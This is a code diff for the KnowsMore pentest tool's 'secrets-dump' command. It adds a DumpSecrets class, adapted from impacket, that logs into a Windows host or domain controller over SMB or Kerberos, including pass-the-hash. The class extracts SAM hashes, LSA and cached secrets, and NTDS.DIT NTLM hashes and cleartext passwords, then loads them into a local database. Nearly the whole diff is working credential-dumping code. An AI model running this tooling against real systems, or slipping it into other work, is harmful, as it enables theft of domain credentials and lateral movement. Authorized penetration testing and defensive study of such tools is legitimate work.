@@ -67,9 +67,13 @@ from impacket.examples import logger
 from impacket.examples.utils import parse_target
 from impacket.smbconnection import SMBConnection
 
-from impacket.examples.secretsdump import LocalOperations, RemoteOperations, SAMHashes, LSASecrets, NTDSHashes, \
+from ..libs.ntdsuseraccount import NTDSUserAccount
+from ..libs.secretsdump import LocalOperations, RemoteOperations, SAMHashes, LSASecrets, NTDSHashes, \
     KeyListSecrets
 from impacket.krb5.keytab import Keytab
+
+from knowsmore.util.knowsmoredb import KnowsMoreDB
+
 try:
     input = raw_input
 except NameError:
@@ -90,17 +94,236 @@ from knowsmore.util.color import Color
 from knowsmore.util.logger import Logger
 from knowsmore.util.tools import Tools
 
-class SecretsDump(CmdBase):
-    class ImportMode(Enum):
-        Undefined = 0
-        NTDS = 1
-        Cracked = 2
-        Password = 3
 
-    filename = ''
+class DumpSecrets:
+    __db = None
+    __secret_callback = None
+
+    def __init__(self, remoteName, username='', password='', domain='', options=None, secret_callback=None):
+        self.__secret_callback = secret_callback
+        self.__useVSSMethod = options.use_vss
+        self.__useKeyListMethod = options.use_keylist
+        self.__remoteName = remoteName
+        self.__remoteHost = options.target_ip
+        self.__username = username
+        self.__password = password
+        self.__domain = domain
+        self.__lmhash = ''
+        self.__nthash = ''
+        self.__aesKey = options.aesKey
+        self.__aesKeyRodc = options.rodcKey
+        self.__smbConnection = None
+        self.__remoteOps = None
+        self.__SAMHashes = None
+        self.__NTDSHashes = None
+        self.__LSASecrets = None
+        self.__KeyListSecrets = None
+        self.__rodc = options.rodcNo
+        self.__systemHive = options.system
+        self.__bootkey = options.bootkey
+        self.__securityHive = options.security
+        self.__samHive = options.sam
+        self.__ntdsFile = options.ntds
+        self.__history = False
+        self.__noLMHash = True
+        self.__isRemote = True
+        self.__outputFileName = None
+        self.__doKerberos = options.k
+        self.__justDC = options.just_dc
+        self.__justDCNTLM = options.just_dc_ntlm
+        self.__justUser = options.just_dc_user
+        self.__pwdLastSet = True
+        self.__printUserStatus = True
+        self.__resumeFileName = options.resumefile
+        self.__canProcessSAMLSA = True
+        self.__kdcHost = options.dc_ip
+        self.__options = options
+
+        if options.hashes is not None:
+            self.__lmhash, self.__nthash = options.hashes.split(':')
+
+    def connect(self):
+        self.__smbConnection = SMBConnection(self.__remoteName, self.__remoteHost)
+        if self.__doKerberos:
+            self.__smbConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,
+                                               self.__nthash, self.__aesKey, self.__kdcHost)
+        else:
+            self.__smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
+
+    def dump(self):
+        try:
+            if self.__remoteName.upper() == 'LOCAL' and self.__username == '':
+                self.__isRemote = False
+                self.__useVSSMethod = True
+                if self.__systemHive:
+                    localOperations = LocalOperations(self.__systemHive)
+                    bootKey = localOperations.getBootKey()
+                    if self.__ntdsFile is not None:
+                    # Let's grab target's configuration about LM Hashes storage
+                        self.__noLMHash = localOperations.checkNoLMHashPolicy()
+                else:
+                    import binascii
+                    bootKey = binascii.unhexlify(self.__bootkey)
+
+            else:
+                self.__isRemote = True
+                bootKey = None
+                try:
+                    try:
+                        self.connect()
+                    except Exception as e:
+                        if os.getenv('KRB5CCNAME') is not None and self.__doKerberos is True:
+                            # SMBConnection failed. That might be because there was no way to log into the
+                            # target system. We just have a last resort. Hope we have tickets cached and that they
+                            # will work
+                            logging.debug('SMBConnection didn\'t work, hoping Kerberos will help (%s)' % str(e))
+                            pass
+                        else:
+                            raise
+
+                    self.__remoteOps  = RemoteOperations(self.__smbConnection, self.__doKerberos, self.__kdcHost)
+                    self.__remoteOps.setExecMethod(self.__options.exec_method)
+                    if self.__justDC is False and self.__justDCNTLM is False and self.__useKeyListMethod is False or self.__useVSSMethod is True:
+                        self.__remoteOps.enableRegistry()
+                        bootKey = self.__remoteOps.getBootKey()
+                        # Let's check whether target system stores LM Hashes
+                        self.__noLMHash = self.__remoteOps.checkNoLMHashPolicy()
+                except Exception as e:
+                    self.__canProcessSAMLSA = False
+                    if str(e).find('STATUS_USER_SESSION_DELETED') and os.getenv('KRB5CCNAME') is not None \
+                        and self.__doKerberos is True:
+                        # Giving some hints here when SPN target name validation is set to something different to Off
+                        # This will prevent establishing SMB connections using TGS for SPNs different to cifs/
+                        logging.error('Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user')
+                    else:
+                        logging.error('RemoteOperations failed: %s' % str(e))
+
+            # If the KerberosKeyList method is enable we dump the secrets only via TGS-REQ
+            if self.__useKeyListMethod is True:
+                try:
+                    self.__KeyListSecrets = KeyListSecrets(self.__domain, self.__remoteName, self.__rodc, self.__aesKeyRodc, self.__remoteOps)
+                    self.__KeyListSecrets.dump()
+                except Exception as e:
+                    logging.error('Something went wrong with the Kerberos Key List approach.: %s' % str(e))
+            else:
+                # If RemoteOperations succeeded, then we can extract SAM and LSA
+                if self.__justDC is False and self.__justDCNTLM is False and self.__canProcessSAMLSA:
+                    try:
+                        if self.__isRemote is True:
+                            SAMFileName = self.__remoteOps.saveSAM()
+                        else:
+                            SAMFileName = self.__samHive
+
+                        self.__SAMHashes = SAMHashes(SAMFileName, bootKey, isRemote = self.__isRemote)
+                        self.__SAMHashes.dump()
+                        if self.__outputFileName is not None:
+                            self.__SAMHashes.export(self.__outputFileName)
+                    except Exception as e:
+                        logging.error('SAM hashes extraction failed: %s' % str(e))
+
+                    try:
+                        if self.__isRemote is True:
+                            SECURITYFileName = self.__remoteOps.saveSECURITY()
+                        else:
+                            SECURITYFileName = self.__securityHive
+
+                        self.__LSASecrets = LSASecrets(SECURITYFileName, bootKey, self.__remoteOps,
+                                                       isRemote=self.__isRemote, history=self.__history)
+                        self.__LSASecrets.dumpCachedHashes()
+                        if self.__outputFileName is not None:
+                            self.__LSASecrets.exportCached(self.__outputFileName)
+                        self.__LSASecrets.dumpSecrets()
+                        if self.__outputFileName is not None:
+                            self.__LSASecrets.exportSecrets(self.__outputFileName)
+                    except Exception as e:
+                        if logging.getLogger().level == logging.DEBUG:
+                            import traceback
+                            traceback.print_exc()
+                        logging.error('LSA hashes extraction failed: %s' % str(e))
+
+                # NTDS Extraction we can try regardless of RemoteOperations failing. It might still work
+                if self.__isRemote is True:
+                    if self.__useVSSMethod and self.__remoteOps is not None and self.__remoteOps.getRRP() is not None:
+                        NTDSFileName = self.__remoteOps.saveNTDS()
+                    else:
+                        NTDSFileName = None
+                else:
+                    NTDSFileName = self.__ntdsFile
+
+                self.__NTDSHashes = NTDSHashes(NTDSFileName, bootKey, isRemote=self.__isRemote, history=self.__history,
+                                               noLMHash=self.__noLMHash, remoteOps=self.__remoteOps,
+                                               useVSSMethod=self.__useVSSMethod, justNTLM=self.__justDCNTLM,
+                                               pwdLastSet=self.__pwdLastSet, resumeSession=self.__resumeFileName,
+                                               outputFileName=self.__outputFileName, justUser=self.__justUser,
+                                               printUserStatus= self.__printUserStatus,
+                                               perSecretCallback=self.__secret_callback)
+                try:
+                    self.__NTDSHashes.dump()
+                except Exception as e:
+                    if logging.getLogger().level == logging.DEBUG:
+                        import traceback
+                        traceback.print_exc()
+                    if str(e).find('ERROR_DS_DRA_BAD_DN') >= 0:
+                        # We don't store the resume file if this error happened, since this error is related to lack
+                        # of enough privileges to access DRSUAPI.
+                        resumeFile = self.__NTDSHashes.getResumeSessionFile()
+                        if resumeFile is not None:
+                            os.unlink(resumeFile)
+                    logging.error(e)
+                    if self.__justUser and str(e).find("ERROR_DS_NAME_ERROR_NOT_UNIQUE") >=0:
+                        logging.info("You just got that error because there might be some duplicates of the same name. "
+                                     "Try specifying the domain name for the user as well. It is important to specify it "
+                                     "in the form of NetBIOS domain name/user (e.g. contoso/Administratror).")
+                    elif self.__useVSSMethod is False:
+                        logging.info('Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter')
+                self.cleanup()
+        except (Exception, KeyboardInterrupt) as e:
+            if logging.getLogger().level == logging.DEBUG:
+                import traceback
+                traceback.print_exc()
+            logging.error(e)
+            if self.__NTDSHashes is not None:
+                if isinstance(e, KeyboardInterrupt):
+                    resumeFile = self.__NTDSHashes.getResumeSessionFile()
+                    if resumeFile is not None:
+                        while True:
+                            answer = input("Delete resume session file? [y/N] ")
+                            if answer.upper() == '':
+                                answer = 'N'
+                                break
+                            elif answer.upper() == 'Y':
+                                answer = 'Y'
+                                break
+                            elif answer.upper() == 'N':
+                                answer = 'N'
+                                break
+                        if answer == 'Y':
+                            os.unlink(resumeFile)
+            try:
+                self.cleanup()
+            except:
+                pass
+
+    def cleanup(self):
+        logging.info('Cleaning up... ')
+        if self.__remoteOps:
+            self.__remoteOps.finish()
+        if self.__SAMHashes:
+            self.__SAMHashes.finish()
+        if self.__LSASecrets:
+            self.__LSASecrets.finish()
+        if self.__NTDSHashes:
+            self.__NTDSHashes.finish()
+        if self.__KeyListSecrets:
+            self.__KeyListSecrets.finish()
+
+
+class SecretsDump(CmdBase):
     db = None
-    mode = ImportMode.Undefined
-    password = None
+    remoteName = username = password = domain = ''
+    options = None
+    ct_count = nt_count = 0
+    domain_cache = {}
 
     def __init__(self):
         super().__init__('secrets-dump', 'Import NTLM hashes and users/machines using impacket lib')
@@ -113,8 +336,8 @@ class SecretsDump(CmdBase):
         cmds.add_argument('-target', action='store',
                           help='[[domain/]username[:password]@]<targetName or address> or LOCAL'
                                ' (if you want to parse local files)')
-        cmds.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
-        cmds.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
+        #cmds.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
+        #cmds.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
         cmds.add_argument('-system', action='store', help='SYSTEM hive to parse')
         cmds.add_argument('-bootkey', action='store', help='bootkey for SYSTEM hive')
         cmds.add_argument('-security', action='store', help='SECURITY hive to parse')
@@ -123,8 +346,8 @@ class SecretsDump(CmdBase):
         cmds.add_argument('-resumefile', action='store', help='resume file name to resume NTDS.DIT session dump (only '
                                                               'available to DRSUAPI approach). This file will also be used to keep updating the session\'s '
                                                               'state')
-        cmds.add_argument('-outputfile', action='store',
-                          help='base output filename. Extensions will be added for sam, secrets, cached and ntds')
+        #cmds.add_argument('-outputfile', action='store',
+        #                  help='base output filename. Extensions will be added for sam, secrets, cached and ntds')
         cmds.add_argument('-use-vss', action='store_true', default=False,
                           help='Use the VSS method instead of default DRSUAPI')
         cmds.add_argument('-rodcNo', action='store', type=int,
@@ -137,7 +360,8 @@ class SecretsDump(CmdBase):
                           help='Remote exec '
                                'method to use at target (only when using -use-vss). Default: smbexec')
 
-        group = cmds.add_argument_group('display options')
+    def add_groups(self, parser: argparse.ArgumentParser):
+        group = parser.add_argument_group('display options')
         group.add_argument('-just-dc-user', action='store', metavar='USERNAME',
                            help='Extract only NTDS.DIT data for the user specified. Only available for DRSUAPI approach. '
                                 'Implies also -just-dc switch')
@@ -145,13 +369,13 @@ class SecretsDump(CmdBase):
                            help='Extract only NTDS.DIT data (NTLM hashes and Kerberos keys)')
         group.add_argument('-just-dc-ntlm', action='store_true', default=False,
                            help='Extract only NTDS.DIT data (NTLM hashes only)')
-        group.add_argument('-pwd-last-set', action='store_true', default=False,
-                           help='Shows pwdLastSet attribute for each NTDS.DIT account. Doesn\'t apply to -outputfile data')
-        group.add_argument('-user-status', action='store_true', default=False,
-                           help='Display whether or not the user is disabled')
-        group.add_argument('-history', action='store_true', help='Dump password history, and LSA secrets OldVal')
+        #group.add_argument('-pwd-last-set', action='store_true', default=False,
+        #                   help='Shows pwdLastSet attribute for each NTDS.DIT account. Doesn\'t apply to -outputfile data')
+        #group.add_argument('-user-status', action='store_true', default=False,
+        #                   help='Display whether or not the user is disabled')
+        #group.add_argument('-history', action='store_true', help='Dump password history, and LSA secrets OldVal')
 
-        group = cmds.add_argument_group('authentication')
+        group = parser.add_argument_group('authentication')
         group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH",
                            help='NTLM hashes, format is LMHASH:NTHASH')
         group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
@@ -164,7 +388,7 @@ class SecretsDump(CmdBase):
                                 ' (128 or 256 bits)')
         group.add_argument('-keytab', action="store", help='Read keys for SPN from keytab file')
 
-        group = cmds.add_argument_group('connection')
+        group = parser.add_argument_group('connection')
         group.add_argument('-dc-ip', action='store', metavar="ip address",
                            help='IP Address of the domain controller. If '
                                 'ommited it use the domain part (FQDN) specified in the target parameter')
@@ -174,322 +398,199 @@ class SecretsDump(CmdBase):
 
     def load_from_arguments(self, args: Namespace) -> bool:
 
-        if args.password != '':
-            if args.password.strip() == '':
-                Tools.mandatory()
+        if args.target is None or args.target == '':
+            Tools.mandatory()
 
-            self.password = Password(
-                ntlm_hash='',
-                clear_text=args.password
-            )
+        domain, username, password, remoteName = parse_target(args.target)
 
-            self.mode = NTLMHash.ImportMode.Password
+        if args.just_dc_user is not None:
+            if args.use_vss is True:
+                Logger.pl('{!} {R}error: -just-dc-user switch is not supported in VSS mode{W}\r\n')
+                Tools.exit_gracefully(1)
+            elif args.resumefile is not None:
+                Logger.pl('{!} {R}error: resuming a previous NTDS.DIT dump session not compatible with -just-dc-user switch{W}\r\n')
+                Tools.exit_gracefully(1)
+            elif remoteName.upper() == 'LOCAL' and username == '':
+                Logger.pl(
+                    '{!} {R}error: -just-dc-user not compatible in LOCAL mode{W}\r\n')
+                Tools.exit_gracefully(1)
+            else:
+                # Having this switch on implies not asking for anything else.
+                args.just_dc = True
+
+        if args.use_vss is True and args.resumefile is not None:
+            Logger.pl(
+                '{!} {R}error: resuming a previous NTDS.DIT dump session is not supported in VSS mode{W}\r\n')
+            Tools.exit_gracefully(1)
+
+        if args.use_keylist is True and (args.rodcNo is None or args.rodcKey is None):
+            Logger.pl(
+                '{!} {R}error: Both the RODC ID number and the RODC key are required for the Kerb-Key-List approach{W}\r\n')
+            Tools.exit_gracefully(1)
+
+        if remoteName.upper() == 'LOCAL' and username == '' and args.resumefile is not None:
+            Logger.pl(
+                '{!} {R}error: resuming a previous NTDS.DIT dump session is not supported in LOCAL mode{W}\r\n')
+            Tools.exit_gracefully(1)
+
+        if remoteName.upper() == 'LOCAL' and username == '':
+            if args.system is None and args.bootkey is None:
+                Logger.pl(
+                    '{!} {R}error: Either the SYSTEM hive or bootkey is required for local parsing, check help{W}\r\n')
+                Tools.exit_gracefully(1)
 
         else:
-            if (args.ntlmfile is None or args.ntlmfile.strip() == '') and \
-                    (args.crackedfile is None or args.crackedfile.strip() == ''):
-                Tools.mandatory()
 
-            if args.ntlmfile is not None and args.ntlmfile.strip() != '':
-                if not os.path.isfile(args.ntlmfile):
-                    Logger.pl('{!} {R}error: NTLM filename is invalid {O}%s{R} {W}\r\n' % (
-                        args.ntlmfile))
-                    Tools.exit_gracefully(1)
+            if args.target_ip is None:
+                args.target_ip = remoteName
 
-                try:
-                    with open(args.ntlmfile, 'r') as f:
-                        # file opened for writing. write to it here
-                        pass
-                except IOError as x:
-                    if x.errno == errno.EACCES:
-                        Logger.pl('{!} {R}error: could not open NTLM hashes file {O}permission denied{R}{W}\r\n')
-                        Tools.exit_gracefully(1)
-                    elif x.errno == errno.EISDIR:
-                        Logger.pl('{!} {R}error: could not open NTLM hashes file {O}it is an directory{R}{W}\r\n')
-                        Tools.exit_gracefully(1)
-                    else:
-                        Logger.pl('{!} {R}error: could not open NTLM hashes file {W}\r\n')
-                        Tools.exit_gracefully(1)
+            if domain is None:
+                domain = ''
 
-                self.mode = NTLMHash.ImportMode.NTDS
-                self.filename = args.ntlmfile
+            if args.keytab is not None:
+                Keytab.loadKeysFromKeytab(args.keytab, username, domain, args)
+                args.k = True
 
-            elif args.crackedfile is not None or args.crackedfile.strip() != '':
-                if not os.path.isfile(args.crackedfile):
-                    Logger.pl('{!} {R}error: NTLM filename is invalid {O}%s{R} {W}\r\n' % (
-                        args.ntlmfile))
-                    Tools.exit_gracefully(1)
+            if password == '' and username != '' and args.hashes is None and args.no_pass is False and args.aesKey is None:
+                from getpass import getpass
 
-                try:
-                    with open(args.crackedfile, 'r') as f:
-                        # file opened for writing. write to it here
-                        pass
-                except IOError as x:
-                    if x.errno == errno.EACCES:
-                        Logger.pl('{!} {R}error: could not open NTLM hashes file {O}permission denied{R}{W}\r\n')
-                        Tools.exit_gracefully(1)
-                    elif x.errno == errno.EISDIR:
-                        Logger.pl('{!} {R}error: could not open NTLM hashes file {O}it is an directory{R}{W}\r\n')
-                        Tools.exit_gracefully(1)
-                    else:
-                        Logger.pl('{!} {R}error: could not open NTLM hashes file {W}\r\n')
-                        Tools.exit_gracefully(1)
+                password = getpass("Password:")
 
-                self.mode = NTLMHash.ImportMode.Cracked
-                self.filename = args.crackedfile
+            if args.aesKey is not None:
+                args.k = True
 
-            if self.mode == NTLMHash.ImportMode.Undefined:
-                Logger.pl('{!} {R}error: Nor {O}--import-ntds{R} or {O}--import-cracked{R} was provided{W}\r\n')
-                Tools.exit_gracefully(1)
+        if remoteName is None or remoteName == '':
+            Tools.mandatory()
+
+        self.remoteName = remoteName
+        self.username = username
+        self.password = password
+        self.domain = domain
+        self.options = args
 
         self.db = self.open_db(args)
 
         return True
 
     def run(self):
-        if self.mode == NTLMHash.ImportMode.Password:
+        self.ct_count = self.nt_count = 0
+        try:
+            #logging.getLogger().setLevel(logging.DEBUG)
+            # Print the Library's installation path
+            #logging.debug(version.getInstallationPath())
+
+            Color.pl('{?} {W}{D}Starting, wait...{W}')
+            dumper = DumpSecrets(self.remoteName,
+                                 self.username,
+                                 self.password,
+                                 self.domain,
+                                 self.options,
+                                 self.__secret_callback)
+            dumper.dump()
+        except KeyboardInterrupt as e:
+            raise e
+        except Exception as e:
+            Tools.clear_line()
+            raise e
+        finally:
+            Tools.clear_line()
+
+    def __secret_callback(self, secret_type, secret):
+
+        if self.nt_count < 0xf or self.nt_count & 0xf == 0:
+            sys.stderr.write("\033[K")
+            print((" Importing: NTDS => %d, Clear text => %d" % (self.nt_count, self.ct_count)), end='\r', flush=True, file=sys.stderr)
+
+        if secret_type == NTDSHashes.SECRET_TYPE.NTDS:
+            if not isinstance(secret, NTDSUserAccount):
+                Logger.pl('{!} {R}error: NTDS hash format is invalid: {O}%s{R}\r\n' % secret)
+                Tools.exit_gracefully(1)
+
+            # Ignore history
+            if secret.history == -1:
+                self.nt_count += 1
+                self.add_credential(secret.domain, secret.user_name, secret.nt_hash)
+
+        elif secret_type == NTDSHashes.SECRET_TYPE.NTDS_KERBEROS:
+            Color.pl('{?} {W}{D}Kerberos: {G}%s{W}' % secret)
+
+        elif secret_type == NTDSHashes.SECRET_TYPE.NTDS_CLEARTEXT:
+            if not isinstance(secret, NTDSUserAccount):
+                Logger.pl('{!} {R}error: NTDS_CLEARTEXT hash format is invalid: {O}%s{R}\r\n' % secret)
+                Tools.exit_gracefully(1)
+
+            self.ct_count += 1
+
+            pwd = Password(
+                ntlm_hash='',
+                clear_text=secret.clear_text
+            )
+
+            self.add_credential(secret.domain, secret.user_name, pwd.ntlm_hash)
 
             pdata = {}
-
             if Configuration.company != '':
-                pdata['company_similarity'] = self.password.calc_ratio(Configuration.company)
+                pdata['company_similarity'] = pwd.calc_ratio(Configuration.company)
 
-            self.db.insert_password_manually(self.password, **pdata)
-            Logger.pl('{+} {C}Password inserted/updated{W}')
+            self.db.insert_password_manually(pwd, **pdata)
 
-            print(' ')
-            Color.pl('{?} {W}{D}Password data:{W}')
-            print(self.password)
+        else:
+            print(secret_type)
+            print(secret)
+            raise Exception('Implement!')
 
-            Color.pl('{?} {W}{D}Looking for user with this password...{W}')
+    def add_credential(self, domain, name, hash):
+        type = 'U'
+        if name.endswith('$'):
+            name = name[:-1]
+            type = 'M'
 
-            sql = (
-                'select c.credential_id, c.name, c.type, c.object_identifier, c.dn, d.domain_id, d.name as domain_name, d.object_identifier as domain_object_identifier, '
-                'd.dn as domain_dn, p.password, p.ntlm_hash, p.md5_hash, p.sha1_hash, p.sha256_hash, p.sha512_hash '
-                'from credentials as c '
-                'inner join passwords as p '
-                'on c.password_id = p.password_id '
-                'inner join domains as d '
-                'on c.domain_id = d.domain_id '
-                ' where p.ntlm_hash like ? '
-                ' order by c.name'
+        if name == '' or hash == '':
+            return
+
+        if domain == '':
+            domain = 'default'
+
+        # try to locate this host previously imported by BloodHound
+        domain_id = -1
+        if domain == 'default':
+            d = self.db.select_raw(
+                sql="select c.domain_id from credentials as c "
+                    "where name = ? and domain_id <> 1 and type = ?",
+                args=[name, type]
             )
-            args = [self.password.ntlm_hash]
+            if len(d) == 1:  # Not permit duplicity
+                domain_id = d[0]['domain_id']
 
-            rows = self.db.select_raw(
-                sql=sql,
-                args=args
-            )
+        if domain_id == -1:
+            domain_id = self.get_domain(domain)
 
-            if len(rows) == 0:
-                Logger.pl('{!} {O}Password/hash inserted but none user found with this password{W}\r\n')
-                exit(0)
-
-            headers = rows[0].keys()
-            data = [item.values() for item in rows]
-
-            print(tabulate(data, headers, tablefmt='psql'))
-
-            Logger.pl('{+} {O}%s{W}{C} register found{W}' % len(rows))
-
-        elif self.mode == NTLMHash.ImportMode.NTDS:
-            (user_index, ntlm_hash_index) = self.get_ntds_columns()
-            min_col = -1
-            if user_index > min_col:
-                min_col = user_index + 1
-            if ntlm_hash_index > min_col:
-                min_col = ntlm_hash_index + 1
-
-            count = 0
-            ignored = 0
-
-            total = Tools.count_file_lines(self.filename)
-
-            with progress.Bar(label=" Processing ", expected_size=total) as bar:
-                try:
-                    with open(self.filename, 'r', encoding="UTF-8", errors="surrogateescape") as f:
-                        line = f.readline()
-                        while line:
-                            count += 1
-                            bar.show(count)
-
-                            line = line.lower()
-                            if line.endswith('\n'):
-                                line = line[:-1]
-                            if line.endswith('\r'):
-                                line = line[:-1]
-
-                            c1 = line.split(':')
-                            if len(c1) < min_col:
-                                ignored += 1
-                                continue
-
-                            f1 = c1[user_index]
-                            hash = c1[ntlm_hash_index]
-
-                            if '\\' in f1:
-                                f1s = f1.strip().split('\\')
-                                domain = f1s[0].strip()
-                                usr = f1s[1].strip()
-                            else:
-                                domain = 'default'
-                                usr = f1.strip()
-
-                            type = 'U'
-
-                            if usr.endswith('$'):
-                                usr = usr[:-1]
-                                type = 'M'
-
-                            if domain == '' or usr == '' or hash == '':
-                                self.print_verbose(f'Line ignored: {line}')
-
-                            # try to locate this host previously imported by BloodHound
-                            domain_id = -1
-                            if domain == 'default':
-                                d = self.db.select_raw(
-                                    sql="select c.domain_id from credentials as c "
-                                        "where name = ? and domain_id <> 1 and type = ?",
-                                    args=[usr, type]
-                                )
-                                if len(d) == 1:  # Not permit duplicity
-                                    domain_id = d[0]['domain_id']
-
-                            if domain_id == -1:
-                                domain_id = self.db.insert_or_get_domain(domain)
-
-                            if domain_id == -1:
-                                Tools.clear_line()
-                                Logger.pl('{!} {R}error: Was not possible to import the domain {O}%s{R}\r\n' % domain)
-                                Tools.exit_gracefully(1)
-
-                            self.db.insert_or_update_credential(
-                                domain=domain_id,
-                                username=usr,
-                                ntlm_hash=hash,
-                                type=type,
-                            )
-
-                            try:
-                                line = f.readline()
-                            except:
-                                pass
-
-                except KeyboardInterrupt as e:
-                    raise e
-                finally:
-                    bar.hide = True
-                    Tools.clear_line()
-                    Logger.pl('{+} {C}Loaded {O}%s{W} lines' % count)
-
-        elif self.mode == NTLMHash.ImportMode.Cracked:
-            count = 0
-            ignored = 0
-
-            if Configuration.company == '':
-                Logger.pl(
-                    '{!} {W}It is recommended import cracked passwords using the parameter {O}--company{W} because '
-                    'the KnowsMore will calculate the score of similarity of the passwords and Company Name.'
-                    )
-                Logger.p(
-                    '{!} {W}Do you want continue without inform company name? (y/N): {W}')
-                c = input()
-                if c.lower() != 'y':
-                    exit(0)
-                print(' ')
-
-            total = Tools.count_file_lines(self.filename)
-            with progress.Bar(label=" Processing ", expected_size=total) as bar:
-                try:
-                    with open(self.filename, 'r', encoding="UTF-8", errors="surrogateescape") as f:
-                        line = f.readline()
-                        while line:
-                            count += 1
-                            bar.show(count)
-
-                            if line.endswith('\n'):
-                                line = line[:-1]
-                            if line.endswith('\r'):
-                                line = line[:-1]
-
-                            c1 = line.split(':', maxsplit=1)
-                            if len(c1) != 2:
-                                ignored += 1
-                                continue
-
-                            pdata = {}
-
-                            password = Password(
-                                ntlm_hash=c1[0].lower(),
-                                clear_text=c1[1]
-                            )
-
-                            if Configuration.company != '':
-                                pdata['company_similarity'] = password.calc_ratio(Configuration.company)
-
-                            self.db.update_password(
-                                password,
-                                **pdata
-                            )
-
-                            try:
-                                line = f.readline()
-                            except:
-                                pass
-
-                except KeyboardInterrupt as e:
-                    raise e
-                finally:
-                    bar.hide = True
-                    Tools.clear_line()
-                    Logger.pl('{+} {C}Loaded {O}%s{W} lines' % count)
-
-    def get_ntds_columns(self):
-        self.print_verbose('Getting file column design')
-        limit = 50
-        count = 0
-        user_index = ntlm_hash_index = -1
-
-        with open(self.filename, 'r', encoding="UTF-8", errors="surrogateescape") as f:
-            line = f.readline()
-            while line:
-                count += 1
-                if count >= limit:
-                    break
-
-                line = line.lower()
-                if line.endswith('\n'):
-                    line = line[:-1]
-                if line.endswith('\r'):
-                    line = line[:-1]
-
-                c1 = line.split(':')
-                if len(c1) < 3:
-                    continue
-
-                for idx, x in enumerate(c1):
-                    if user_index == -1:
-                        if '$' in x or '\\' in x:
-                            user_index = idx
-
-                    if ntlm_hash_index == -1:
-                        hash = re.sub("[^a-f0-9]", '', x.lower())
-                        if len(hash) == 32 and hash != "aad3b435b51404eeaad3b435b51404ee":
-                            ntlm_hash_index = idx
-
-                if user_index != -1 and ntlm_hash_index != -1:
-                    break
-
-                if user_index == -1 or ntlm_hash_index == -1:
-                    user_index = ntlm_hash_index = -1
-
-                try:
-                    line = f.readline()
-                except:
-                    pass
-
-        if user_index < 0 or ntlm_hash_index < 0:
-            Logger.pl('{!} {R}error: import file format not recognized {W}\r\n')
+        if domain_id == -1:
+            Tools.clear_line()
+            Logger.pl('{!} {R}error: Was not possible to import the domain {O}%s{R}\r\n' % domain)
             Tools.exit_gracefully(1)
 
-        return user_index, ntlm_hash_index
+        self.db.insert_or_update_credential(
+            domain=domain_id,
+            username=name,
+            ntlm_hash=hash,
+            type=type,
+        )
+
+    def get_domain(self, name: str) -> int:
+
+        name = name.lower()
+
+        if name in self.domain_cache:
+            return self.domain_cache[name]
+
+        domain_id = self.db.insert_or_get_domain(
+            domain=name
+        )
+
+        if domain_id == -1:
+            raise Exception('Unable to get/create domain from Name: %s' % name)
+
+        self.domain_cache[name] = domain_id
+
+        return domain_id
